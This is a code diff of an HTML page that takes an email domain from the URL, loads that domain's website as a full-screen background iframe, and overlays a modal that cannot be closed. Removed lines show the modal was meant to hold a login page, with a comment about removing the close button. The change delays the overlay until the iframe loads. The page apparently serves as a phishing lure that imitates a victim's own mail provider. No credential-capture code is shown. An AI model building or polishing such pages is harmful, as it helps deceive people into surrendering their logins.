@@ -27,6 +27,7 @@
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
             z-index: 100; /* Ensure the overlay covers the background */
+            display: none; /* Initially hidden */
         }
 
         #modal {
@@ -37,14 +38,15 @@
             background-color: white;
             padding: 20px;
             z-index: 101; /* Modal appears above the overlay */
+            display: none; /* Initially hidden */
         }
     </style>
 </head>
 <body>
     <div id="overlay"></div>
     <div id="modal">
-        <p>login page here</p>
-        <!-- Remove the button to prevent closing the modal -->
+        <p>This is the modal content.</p>
+        <!-- Modal content remains visible and does not close -->
     </div>
 
     <script>
@@ -58,8 +60,8 @@
             return '';
         }
 
-        // Function to display the iframe with the email domain and show the modal
-        function showModal() {
+        // Function to display the iframe with the email domain
+        function showModalWhenIframeLoads() {
             const queryString = window.location.search;
             const domain = getEmailDomain(queryString);
 
@@ -69,14 +71,17 @@
                 iframe.className = 'background-iframe';
                 document.body.appendChild(iframe); // Add the iframe to the body
 
-                document.getElementById('overlay').style.display = 'block';
-                document.getElementById('modal').style.display = 'block';
-                document.body.classList.add('inactive'); // Disable background scrolling
+                // Show modal only after iframe has fully loaded
+                iframe.onload = function() {
+                    document.getElementById('overlay').style.display = 'block';
+                    document.getElementById('modal').style.display = 'block';
+                    document.body.classList.add('inactive'); // Disable background scrolling
+                };
             }
         }
 
-        // Display the modal and email domain iframe on page load
-        window.onload = showModal;
+        // Start loading the iframe on page load
+        window.onload = showModalWhenIframeLoads;
     </script>
 </body>
 </html>
